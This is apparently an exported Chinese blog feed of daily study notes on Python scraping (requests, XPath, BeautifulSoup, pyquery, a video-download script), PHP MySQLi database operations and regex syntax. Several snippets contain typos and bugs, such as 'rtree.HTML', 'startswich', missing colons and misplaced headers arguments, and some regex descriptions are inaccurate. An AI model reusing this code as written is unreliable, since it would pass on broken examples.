              //获取请求网址response.json()                  //内置JSON解码器Response.headers                 //以字典对象存储服务器响应头，字典不分大小写获取二进制数据实例:import requestsurl=&#39;目标文件的地址&#39;response=requests.get(url)with open(&#39;文件名,模式&#39;,&#39;wb&#39;) as file:              //读写文件的操作    file.write(response.content)    常用参数:r:   以只读方式打开文件。文件的指针将会放在文件的开头。这是**默认模式**。r+:  打开一个文件用于读写。文件指针将会放在文件的开头。w:   打开一个文件只用于写入。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。w+:  打开一个文件用于读写。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。a:   打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。a+:  打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。rb:  以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。rb+: 以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。wb:  以二进制格式打开一个文件只用于写入。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。wb+: 以二进制格式打开一个文件用于读写。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。ab:  以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。ab+: 以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。file.read([size])        将文件数据作为字符串返回，可选参数size控制读取的字节数file.readlines([size])   返回文件中行内容的列表，size参数可选file.write(str)          将字符串写入文件file.writelines(strings) 将字符串序列写入文件file.close()             关闭文件file.closed              表示文件已经被关闭，否则为Falsefile.mode                Access文件打开时使用的访问模式file.encoding            文件所使用的编码file.name                文件名file.newlines            未读取到行分隔符时为None，只有一种行分隔符时为一个字符串，当文件有多种类型的行结束符时，则为一个包含所有当前所遇到的行结束的列表file.softspace           为0表示在输出一数据后，要加上一个空格符，1表示不加。这个属性一般程序员用不着，由程序内部使用</code></pre><h4 id="XPath解析数据-lxml库"><a href="#XPath解析数据-lxml库" class="headerlink" title="XPath解析数据(lxml库)"></a>XPath解析数据(lxml库)</h4><p>概述:<br>小型查询语言，在XML文档中查找信息的语言<br>优点:<br>可在XPath中查找信息<br>支持HTML查找<br>可通过元素和属性进行导航<br>XML树形结构和语句与HTML相类似<br>XPath语法点击<a href="https://blog.csdn.net/Victor2code/article/details/108298390?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166877297016782395359090%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166877297016782395359090&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-108298390-null-null.142%5Ev65%5Eopensearch_v2,201%5Ev3%5Econtrol,213%5Ev2%5Et3_esquery_v2&utm_term=xpath%E8%AF%AD%E6%B3%95&spm=1018.2226.3001.4187">此处</a><br>代码实现:</p><pre><code>import requestsfrom lxml import etreeurl=&#39;目标地址&#39;headers=&#123;请求头信息，以键值对形式存储&#125;response=requests.get(url,headers)etree=rtree.HTML(response.text)                       //将响应的str类型转换为etree类型A=etree.xpath(&#39;谷歌浏览器中XPath的语句&#39;)              //获取内容B=etree.path(&#39;另一个语句&#39;)for A中定位的元素,B中定位的元素 in zip(A,B)           //遍历打包    print(A中定位的元素, &#39;:&#39; ,B中定位的元素)          //输出</code></pre><h4 id="BeautifulSoup解析数据-bs4库"><a href="#BeautifulSoup解析数据-bs4库" class="headerlink" title="BeautifulSoup解析数据(bs4库)"></a>BeautifulSoup解析数据(bs4库)</h4><p>概述:<br>能从HTML和XML文件中提取数据的库<br>语法:</p><pre><code>                        【Tag对象】print(bs.标签)                       //获取标签print(bs.标签.attrs)                 //获取标签的全部属性print(bs.标签[&#39;属性名&#39;])             //获取属性值print(bs.标签.text)                  //获取标签的文本内容(不包括注释内的)print(bs.标签.string)                //获取标签的文本内容(包括注释内的)                        【CSS选择器】print(bs.select(&#39;ID&#39;))               //ID查找print(bs.select(&#39;classa&#39;))           //classa查找print(bs.select(标签,属性))          //属性查找                        【其他功能】print(bs.find(标签,属性))            //提取首个满足条件的print(bs.find_all(标签,属性))        //提取所有满足条件的</code></pre><p>代码实现:</p><pre><code>import requestsfrom bs4 import BeautifulSoupurl=&#39;目标地址&#39;headers=&#123;头文件键值对&#125;response=requests.get(url,headers)bs=BeautifulSoup(response.text,&#39;html.parser&#39;)               //bs=BeautifulSoup(response.text,&#39;lxml&#39;)二选一使用即可a_list=bs.find_all(&#39;标签&#39;)for a in a_list:    url=a.get(&#39;属性&#39;)    if url==None                                              //以None开头的url无用        continue    if url.startswich(&#39;http&#39;) or url.startswich(&#39;https&#39;)      //保留以http或https开头的url        print(url)</code></pre><h4 id="正则表达式-re库"><a href="#正则表达式-re库" class="headerlink" title="正则表达式(re库)"></a>正则表达式(re库)</h4><p>概述:<br>特殊的字符序列，检查字符串是否与某种模式相匹配<br>正则语法:</p><pre><code>.           //匹配任意字符^           //匹配字符串开头$           //匹配字符串末尾*           //匹配前一个元字符0到多次+           //匹配前一个元字符1到多次?           //匹配前一个元字符0到1次&#123;m&#125;         //匹配前一个元字符m次&#123;m,n&#125;       //匹配前一个元字符m到n次&#123;m,n&#125;?      //匹配前一个元字符m到n次，并去尽可能少的情况\\          //对特殊字符转义[]          //字符集合，匹配其中任意一个字符|           //或(...)       //作为一个元组，findall在有组情况下只显示组的内容</code></pre><p>特殊序列:</p><pre><code>\A          //只在字符串开头匹配\b          //匹配开头或结尾的空字符串\B          //匹配不位于开头或结尾的空字符串\d          //匹配十进制数，[0-9]\D          //匹配非字符数字字符，[^0-9]s           //匹配空白字符，[\t\n\r\f\v]\S          //匹配非空白字符，[^\t\n\r\f\v]\w          //匹配数字字母下划线，[a-z A-Z 0-9]\W          //匹配非数字字母下划线，[^a-z A-Z 0-9]\Z          //只在字符串末尾进行匹配[\u4e00-\u9fa5]         //中文</code></pre><p>正则处理函数:</p><pre><code>re.match(pattern,string,flags=0)                  //从字符串开头匹配模式，成功则返回成功的对象，否则返回Nonere.search(pattern,string,flags=0)                 //扫描整个字符串返回第一个成功匹配的对象，失败则返回Nonere.findall(pattern,string,flags=0)                //获取列表的所有匹配的字符串，以列表形式返回re.sub(pattern,repl,string,count=0,flags=0)       //用于替换字符串的匹配项，没有匹配项则返回没有匹配的字符串re.compile(pattern,[,flag])                       //编译正则表达式，生成正则表达式对象，供match和search函数使用</code></pre><h4 id="爬取并下载视频示例"><a href="#爬取并下载视频示例" class="headerlink" title="爬取并下载视频示例"></a>爬取并下载视频示例</h4><pre><code>import requestsimport reurl=&#39;目标地址&#39;headers=&#123;请求头&#125;response=requests.get(url,headers=headers)                            //发送请求info=re.findall(&#39;标签，配合使用正则表达式&#39;,response.text)             //正则查找所有符合要求的对象lst=[]for item in info:    lst.append(&#39;https:&#39;+item)                                         //将符合条件的对象放入列表中并补全绝对路径count=0for item in lst:    count+=1    response=requests.get(item.headers=headers)                       //将补全的路径再次请求    with open(&#39;存储路径&#39;+str(count)+&#39;后缀&#39;) as file                   //设置下载路径和文件名        file.write(response.content)                                  //将文件存为二进制print(下载完毕)</code></pre><h4 id="pyquery解析数据-pyquery库"><a href="#pyquery解析数据-pyquery库" class="headerlink" title="pyquery解析数据(pyquery库)"></a>pyquery解析数据(pyquery库)</h4><p>概述:<br>是jQuery的Python实现，可以jQuery语法操作解析HTML文档，易用性和解析速度很好<br>初始化方式:</p><pre><code>字符串方式from pyquery import PyQuery as pyhtml=&#39;html代码&#39;doc=py(html)      //创建PyQuery对象，将str类型转换为PyQuery类型url方式from pyquery import PyQuerydoc=PyQuery(url=&#39;地址&#39;,encoding=&#39;utf-8&#39;)文件from pyquery import PyQuerydoc=PyQuery(filename=&#39;存有html文件的地址&#39;)</code></pre><p>使用方式:</p><pre><code>doc(&#39;#main&#39;)                             //获取当前节点doc(&#39;#main&#39;).children()                  //获取子节点doc(&#39;#main&#39;).parent()                    //获取父节点doc(&#39;#main&#39;).sinlings()                  //获取兄弟节点doc(&#39;标签&#39;)attr(&#39;属性&#39;)                  //获取属性值doc(&#39;#main&#39;).html()                      //获取内容，以html代码形式显示doc(&#39;#main&#39;).text()                      //获取内容，以文本显示显示</code></pre><p>代码实现:</p><pre><code>import requestsfrom pyquery import PyQuery as pyurl=&#39;&#39;headers=&#123;&#125;response=resquests.get(url,headers=headers)   //发送请求doc=py(response.text)                         //初始化PyQuery对象A=[x.text for x in doc(h4 a)]                 //从doc中提取h4中的a标签的内容传给x，再显示x的文本部分</code></pre><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>requests用于发送和接收请求<br>四种解析方式是数据的提取<br>对于爬虫更重要的是提取了数据之后对数据的操作</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="想不清楚一件事，往往因为这件事里有你想逃避的东西。"><a href="#想不清楚一件事，往往因为这件事里有你想逃避的东西。" class="headerlink" title="想不清楚一件事，往往因为这件事里有你想逃避的东西。"></a>想不清楚一件事，往往因为这件事里有你想逃避的东西。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221116</title>
      <link href="/2022/11/16/20221116/"/>
      <url>/2022/11/16/20221116/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><p>php7之前是mysql链接(硬链接)<br>php7之后是mysqli链接(i链接/improved链接)</p><h4 id="PHP连接数据库-MySQLi-面向对象"><a href="#PHP连接数据库-MySQLi-面向对象" class="headerlink" title="PHP连接数据库(MySQLi - 面向对象)"></a>PHP连接数据库(MySQLi - 面向对象)</h4><pre><code>&lt;?php$servername = &quot;localhost&quot;;$username = &quot;username&quot;;$password = &quot;password&quot;;// 创建连接$conn = new mysqli($servername, $username, $password);// 检测连接if ($conn-&gt;connect_error) &#123;    die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);&#125;echo &quot;Connected successfully&quot;;?&gt;</code></pre><h4 id="关闭连接-MySQLi-面向对象"><a href="#关闭连接-MySQLi-面向对象" class="headerlink" title="关闭连接(MySQLi - 面向对象)"></a>关闭连接(MySQLi - 面向对象)</h4><p>连接在脚本执行完后会自动关闭,也可以手动关闭<br>$conn-&gt;close();</p><h4 id="创建数据库-MySQLi-面向对象"><a href="#创建数据库-MySQLi-面向对象" class="headerlink" title="创建数据库(MySQLi - 面向对象)"></a>创建数据库(MySQLi - 面向对象)</h4><p>需要 CREATE 权限来创建或删除 MySQL 数据库。</p><pre><code>&lt;?php$servername = &quot;localhost&quot;;$username = &quot;username&quot;;$password = &quot;password&quot;;// 创建连接$conn = new mysqli($servername, $username, $password);// 检测连接if ($conn-&gt;connect_error) &#123;    die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);&#125;// Create database$sql = &quot;CREATE DATABASE myDB&quot;;                     //库名叫做myDBif ($conn-&gt;query($sql) === TRUE) &#123;    echo &quot;Database created successfully&quot;;&#125; else &#123;    echo &quot;Error creating database: &quot; . $conn-&gt;error;&#125;$conn-&gt;close();?&gt;</code></pre><h4 id="创建表-MySQLi-面向对象"><a href="#创建表-MySQLi-面向对象" class="headerlink" title="创建表(MySQLi - 面向对象)"></a>创建表(MySQLi - 面向对象)</h4><p>在 PHP 中创建完数据库之后，我们需要在数据库中创建一个或者多个的数据表。<br>一个数据表有一个唯一名称，并有行和列组成。<br>创建表前，我们需要使用use myDB;来选择要操作的数据库</p><pre><code>&lt;?php$servername = &quot;localhost&quot;;$username = &quot;username&quot;;$password = &quot;password&quot;;$dbname = &quot;myDB&quot;;// 创建连接$conn = new mysqli($servername, $username, $password, $dbname);// 检测连接if ($conn-&gt;connect_error) &#123;    die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);&#125;// sql to create table$sql = &quot;CREATE TABLE MyGuests (id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,firstname VARCHAR(30) NOT NULL,lastname VARCHAR(30) NOT NULL,email VARCHAR(50),reg_date TIMESTAMP)&quot;;if ($conn-&gt;query($sql) === TRUE) &#123;    echo &quot;Table MyGuests created successfully&quot;;&#125; else &#123;    echo &quot;Error creating table: &quot; . $conn-&gt;error;&#125;$conn-&gt;close();?&gt;</code></pre><p>其中表内数据类型有<a href="https://www.w3cschool.cn/mysql/sql-datatypes.html">规定</a></p><p>同时可以为每个列指定其他选项的属性:<br>NOT NULL - 每一行都必须含有值（不能为空），null 值是不允许的。<br>DEFAULT value - 设置默认值<br>UNSIGNED - 使用无符号数值类型，0 及正数<br>AUTO INCREMENT - 设置 MySQL 字段的值在新增记录时每次自动增长 1<br>PRIMARY KEY - 设置数据表中每条记录的唯一标识。 通常列的 PRIMARY KEY 设置为 ID 数值，与AUTO_INCREMENT 一起使用。</p><p>每个表都应该有一个主键(本列为 “id” 列)，主键必须包含唯一的值。</p><h4 id="插入数据-MySQLi-面向对象"><a href="#插入数据-MySQLi-面向对象" class="headerlink" title="插入数据(MySQLi - 面向对象)"></a>插入数据(MySQLi - 面向对象)</h4><p>语法规则:<br>1.PHP 中 SQL 查询语句必须使用引号<br>2.在 SQL 查询语句中的字符串值必须加引号<br>3.数值的值不需要引号<br>4.NULL 值不需要引号<br>向 MySQL 表添加新的记录:<br>INSERT INTO table_name (column1, column2, column3,…)<br>VALUES (value1, value2, value3,…)</p><pre><code>在连接检测和关闭数据库中间加入$sql = &quot;INSERT INTO MyGuests (firstname, lastname, email)VALUES (&#39;John&#39;, &#39;Doe&#39;, &#39;john@example.com&#39;)&quot;;                    //向 &quot;MyGuests&quot; 表添加新的记录if ($conn-&gt;query($sql) === TRUE) &#123;    echo &quot;New record created successfully&quot;;&#125; else &#123;    echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error;&#125;</code></pre><h4 id="插入多条数据-MySQLi-面向对象"><a href="#插入多条数据-MySQLi-面向对象" class="headerlink" title="插入多条数据(MySQLi - 面向对象)"></a>插入多条数据(MySQLi - 面向对象)</h4><p>【方法一:使用函数】<br>mysqli_multi_query() 函数可用来执行多条SQL语句。</p><pre><code>$sql = &quot;INSERT INTOMyGuests (firstname, lastname, email)VALUES (&#39;John&#39;, &#39;Doe&#39;, &#39;john@example.com&#39;);&quot;;$sql .= &quot;INSERT INTOMyGuests (firstname, lastname, email)VALUES (&#39;Mary&#39;, &#39;Moe&#39;, &#39;mary@example.com&#39;);&quot;;$sql .= &quot;INSERT INTOMyGuests (firstname, lastname, email)VALUES (&#39;Julie&#39;, &#39;Dooley&#39;, &#39;julie@example.com&#39;)&quot;;if ($conn-&gt;multi_query($sql) === TRUE) &#123;echo &quot;Newrecords created successfully&quot;;&#125; else &#123;echo&quot;Error: &quot; . $sql . &quot;&quot; . $conn-&gt;error;&#125;</code></pre><p>注意:每个SQL语句必须用分号隔开。</p><p>【方法二:MySQLi 使用预处理语句】</p><pre><code>// 为 mysqli_stmt_prepare() 初始化statement 对象$stmt =mysqli_stmt_init($conn);//预处理语句if (mysqli_stmt_prepare($stmt, $sql)) &#123;// 绑定参数mysqli_stmt_bind_param($stmt, &#39;sss&#39;, $firstname, $lastname, $email);// 设置参数并执行$firstname = &#39;John&#39;;$lastname= &#39;Doe&#39;;$email =&#39;john@example.com&#39;;mysqli_stmt_execute($stmt);$firstname = &#39;Mary&#39;;$lastname= &#39;Moe&#39;;$email =&#39;mary@example.com&#39;;mysqli_stmt_execute($stmt);$firstname = &#39;Julie&#39;;$lastname = &#39;Dooley&#39;;$email =&#39;julie@example.com&#39;;mysqli_stmt_execute($stmt);&#125;</code></pre><p>每个参数必须指定类型，来保证数据的安全性。通过类型的判断可以减少SQL注入漏洞带来的风险。<br>参数类型:<br>i - integer<br>d - double<br>s - string<br>b - BLOB</p><h4 id="MySQLi使用预处理语句-包括面向对象和面向过程"><a href="#MySQLi使用预处理语句-包括面向对象和面向过程" class="headerlink" title="MySQLi使用预处理语句(包括面向对象和面向过程)"></a>MySQLi使用预处理语句(包括面向对象和面向过程)</h4><p>流程:<br>1.预处理:创建 SQL 语句模板并发送到数据库。预留的值使用参数 “?” 标记<br>2.数据库解析并编译(内部处理):对SQL语句模板执行查询优化，并存储结果(不输出)<br>3.执行:将应用绑定的值传递给参数（?标记），数据库执行语句。(如果参数的值不一样,可以多次执行语句)</p><p>优点:<br>1.减少了分析时间，只做了一次查询（虽然语句多次执行）<br>2.绑定参数减少了服务器带宽，你只需要发送查询的参数，而不是整个语句<br>3.预处理语句针对SQL注入是非常有用的，因为参数值发送后使用不同的协议，保证了数据的合法性。</p><pre><code>// 步骤一，prepare and bind$stmt = $conn-&gt;prepare(&quot;INSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?)&quot;);$stmt-&gt;bind_param(&quot;sss&quot;, $firstname, $lastname, $email);// 步骤三，设置参数并执行$firstname = &quot;John&quot;;$lastname = &quot;Doe&quot;;$email = &quot;john@example.com&quot;;$stmt-&gt;execute();$firstname = &quot;Mary&quot;;$lastname = &quot;Moe&quot;;$email = &quot;mary@example.com&quot;;$stmt-&gt;execute();             $firstname = &quot;Julie&quot;;$lastname = &quot;Dooley&quot;;$email = &quot;julie@example.com&quot;;$stmt-&gt;execute();echo &quot;New records created successfully&quot;;$stmt-&gt;close();</code></pre><p>语句中如果有?就转换为其他类型的数据</p><h4 id="读取数据-MySQLi-面向对象"><a href="#读取数据-MySQLi-面向对象" class="headerlink" title="读取数据(MySQLi - 面向对象)"></a>读取数据(MySQLi - 面向对象)</h4><pre><code>SELECT 语句用于从数据表中读取数据:SELECT column_name(s) FROM table_name我们可以使用 * 号来读取所有数据表中的字段:SELECT * FROM table_name用 WHERE 命令来筛选出满足条件的结果:SELECT column_name(s)  FROM table_name  WHERE column_name operator value——————————————————————————————————————————————————————————————————————————————                           【SELECT】$sql = &quot;SELECT id, firstname, lastname FROM MyGuests&quot;;$result = $conn-&gt;query($sql);if ($result-&gt;num_rows &gt; 0) &#123;    // 输出每行数据    while($row = $result-&gt;fetch_assoc()) &#123;        echo &quot;id: &quot;. $row[&quot;id&quot;]. &quot; - Name: &quot;. $row[&quot;firstname&quot;]. &quot; &quot; . $row[&quot;lastname&quot;]. &quot;&lt;br&gt;&quot;;    &#125;&#125; else &#123;    echo &quot;0 results&quot;;&#125;——————————————————————————————————————————————————————————————————————————————                           【WHERE】$result = mysqli_query($con,&quot;SELECT * FROM PersonsWHERE FirstName=&#39;Peter&#39;&quot;);while($row = mysqli_fetch_array($result))&#123;echo $row[&#39;FirstName&#39;] . &quot; &quot; . $row[&#39;LastName&#39;];echo &quot;&lt;br&gt;&quot;;&#125;</code></pre><h4 id="处理数据"><a href="#处理数据" class="headerlink" title="处理数据"></a>处理数据</h4><pre><code>ORDER BY 关键词用于对记录集中的数据进行排序。SELECT column_name(s)FROM table_nameORDER BY column1, column2... ASC|DESC    默认是升序ASC，DESC改为降序$result = mysqli_query($con,&quot;SELECT * FROM Persons ORDER BY age&quot;);while($row = mysqli_fetch_array($result))&#123;echo $row[&#39;FirstName&#39;];echo &quot; &quot; . $row[&#39;LastName&#39;];echo &quot; &quot; . $row[&#39;Age&#39;];echo &quot;&lt;br&gt;&quot;;&#125;可以根据多个列进行排序(第一列的值相同时才使用第二列)</code></pre><h4 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h4><p>UPDATE 语句用于更新数据库表中已存在的记录。<br>WHERE 子句规定了哪些记录需要更新。<br>如果您想省去 WHERE 子句，所有的记录都会被更新！<br>PHP执行该语句，必须使用mysqli_query()函数(该函数用于向 MySQL 连接发送查询或命令)</p><pre><code>语法:UPDATE table_name SET column1=value, column2=value2,... WHERE some_column=some_value 操作:mysqli_query($con,&quot;UPDATE Persons SET Age=36WHERE FirstName=&#39;Peter&#39; AND LastName=&#39;Griffin&#39;&quot;);</code></pre><h4 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h4><p>DELETE FROM 语句用于从数据库表中删除记录。<br>WHERE 子句规定了哪些记录需要更新。<br>如果您想省去 WHERE 子句，所有的记录都会被更新！<br>PHP执行该语句，必须使用mysqli_query()函数(该函数用于向 MySQL 连接发送查询或命令)</p><pre><code>语法:DELETE FROM table_name WHERE some_column = some_value操作:mysqli_query($con,&quot;DELETE FROM Persons WHERE LastName=&#39;Griffin&#39;&quot;);</code></pre><h4 id="PHP中有关MySQL数据库的内容暂时告一段落，若想了解MySQLi-面向过程和PDO请前往此处"><a href="#PHP中有关MySQL数据库的内容暂时告一段落，若想了解MySQLi-面向过程和PDO请前往此处" class="headerlink" title="PHP中有关MySQL数据库的内容暂时告一段落，若想了解MySQLi - 面向过程和PDO请前往此处"></a>PHP中有关MySQL数据库的内容暂时告一段落，若想了解MySQLi - 面向过程和PDO请前往<a href="https://www.w3cschool.cn/php/php-mysql-connect.html">此处</a></h4><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="我们生而破碎，用活着来修修补补。"><a href="#我们生而破碎，用活着来修修补补。" class="headerlink" title="我们生而破碎，用活着来修修补补。"></a>我们生而破碎，用活着来修修补补。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221115</title>
      <link href="/2022/11/15/20221115/"/>
      <url>/2022/11/15/20221115/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>概念:正则表达式是用于描述字符排列和匹配模式的一种语法规则。<br>作用:<br>1.匹配，也常常用于从字符串中析取信息。<br>2.用新文本代替匹配文本。<br>3.将一个字符串拆分为一组更小的信息块。<br>基本语法:<br>1.正则匹配模式使用分隔符与元字符组成<br>(1)分隔符可以是非数字、非反斜线、非空格的任意字符<br>(2)经常使用的分隔符是正斜线(/)、hash符号(#) 以及取反符号(~)<br>2.元字符是用于构造规则表达式的具有特殊含义的字符<br>3.如果要在正则表达式中包含元字符本身，必须在其前加上”\”进行转义 </p><pre><code>           【常见元字符】 元字符             说明*                0次、1次或多次匹配其前的原子+                1次或多次匹配其前的原子?                0次或1次匹配其前的原子|                匹配两个或多个选择^                匹配字符串串首的原子$                匹配字符串串尾的原子[]                匹配方括号中的任一原子[^]                匹配除方括号中的原子外的任何字符&#123;m&#125;                表示其前原子恰好出现m次&#123;m,n&#125;            表示其前原子至少出现m次，至少出现n次(n&gt;m)&#123;m,&#125;            表示其前原子出现不少于m次()                整体表示一个原子.                匹配除换行之外的任何一个字符边界限制:1.^和$分别指定字符串的开始和结束。2.^Tom$精确匹配————Tom模糊匹配3.重复匹配:    ?匹配存在?前的一个字母或是不存在这个字母的字符串    *匹配0/1/多次匹配该字母的字符串    +匹配1/多次该字母的字符串    .匹配除换行符外的任何字符    .*组合称为全匹配符或单含匹配符    &#123;&#125;指定原子重复的次数        &#123;m&#125;表示其前原子恰好出现m次；        &#123;m，n&#125;表示其前原子至少出现m次，至多出现n次；        &#123;m，&#125;表示其前原子出现不少于m次。    []匹配其中的一个原子并且地位平等    |匹配多个选择之一，可以连用|4.模式单元:    ()将其中的正则表达式变为原子(或称为模式单元)使用————其实用处相等于数学的括号5.模式匹配的顺序(从高到低):  顺序    元字符         说明  1        （）          模式单元      2       ？* +&#123;&#125;        重复匹配  3         ^$           边界限制  4         |            模式选择</code></pre><p>特殊字符:<br>$匹配输入字符串的结尾位置<br>()标记表达式开始与结束的位置<br>*匹配前面的子表达式0次或多次<br>+匹配前面的子表达式1次或多次<br>.匹配除换行符\n外的任何单字符<br>[标记一个中括号表达式的开始<br>?匹配前面的子表达式0次或一次，或指明一个非贪婪限定符<br>\将下一个字符标记为特殊字符/原义字符/向后引用/八进制转义符<br>^匹配字符串的开始位置(在方括号中表示不接受该字符集合)<br>{标记限定符巴达兽的开始<br>|指明两项之间的一个选择</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="生活哪有什么胜利可言，挺住意味着一切。"><a href="#生活哪有什么胜利可言，挺住意味着一切。" class="headerlink" title="生活哪有什么胜利可言，挺住意味着一切。"></a>生活哪有什么胜利可言，挺住意味着一切。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>元字符表</title>
      <link href="/2022/11/15/%E5%85%83%E5%AD%97%E7%AC%A6%E8%A1%A8/"/>
      <url>/2022/11/15/%E5%85%83%E5%AD%97%E7%AC%A6%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<pre><code>字符     描述\        将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，’n’ 匹配字符 “n”。’\n’ 匹配一个换行符。序列 ‘\\’ 匹配 “\” 而 “\(” 则匹配 “(”。^        匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\n’ 或 ‘\r’ 之后的位置。$        匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\n’ 或 ‘\r’ 之前的位置。*        匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于&#123;0,&#125;。+        匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 &#123;1,&#125;。?        匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 或 “does” 中的”do” 。? 等价于 &#123;0,1&#125;。&#123;n&#125;       n是一个非负整数。匹配确定的 n 次。例如，’o&#123;2&#125;’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。&#123;n,&#125;      n是一个非负整数。至少匹配n 次。例如，’o&#123;2,&#125;’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o&#123;1,&#125;’ 等价于 ‘o+’。’o&#123;0,&#125;’ 则等价于 ‘o*’。&#123;n,m&#125;     m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o&#123;1,3&#125;” 将匹配 “fooooood” 中的前三个 o。’o&#123;0,1&#125;’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。?         当该字符紧跟在任何一个其他限制符 (*, +, ?, &#123;n&#125;, &#123;n,&#125;, &#123;n,m&#125;) 后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串 “oooo”，’o+?’ 将匹配单个 “o”，而 ‘o+’ 将匹配所有 ‘o’。.         匹配除 “\n” 之外的任何单个字符。要匹配包括 ‘\n’ 在内的任何字符，请使用象 ‘[.\n]’ 的模式。(pattern)    匹配 pattern 并获取这一匹配。所获取的匹配可以从产生的 Matches 集合得到，在VBScript 中使用 SubMatches 集合，在JScript 中则使用 $0…$9 属性。要匹配圆括号字符，请使用 ‘′或‘’。(?:pattern)    匹 配 pattern 但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用 “或” 字符 (|) 来组合一个模式的各个部分是很有用。例如， ‘industr(?:y|ies) 就是一个比 ‘industry|industries’ 更简略的表达式。(?=pattern)    正 向预查，在任何匹配 pattern 的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，’Windows (?=95|98|NT|2000)’ 能匹配 “Windows 2000″ 中的 “Windows” ，但不能匹配 “Windows 3.1″ 中的 “Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。(?!pattern)    负 向预查，在任何不匹配 pattern 的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如’Windows (?!95|98|NT|2000)’ 能匹配 “Windows 3.1″ 中的 “Windows”，但不能匹配 “Windows 2000″ 中的 “Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始x|y    匹配 x 或 y。例如，’z|food’ 能匹配 “z” 或 “food”。’(z|f)ood’ 则匹配 “zood” 或 “food”。[xyz]    字符集合。匹配所包含的任意一个字符。例如， ‘[abc]’ 可以匹配 “plain” 中的 ‘a’。[^xyz]    负值字符集合。匹配未包含的任意字符。例如， ‘[^abc]’ 可以匹配 “plain” 中的’p&#39;。[a-z]    字符范围。匹配指定范围内的任意字符。例如，’[a-z]’ 可以匹配 ‘a’ 到 ‘z’ 范围内的任意小写字母字符。[^a-z]    负值字符范围。匹配任何不在指定范围内的任意字符。例如，’[^a-z]’ 可以匹配任何不在 ‘a’ 到 ‘z’ 范围内的任意字符。\b    匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\b’ 可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。\B    匹配非单词边界。’er\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。\cx    匹配由 x 指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。\d    匹配一个数字字符。等价于 [0-9]。\D    匹配一个非数字字符。等价于 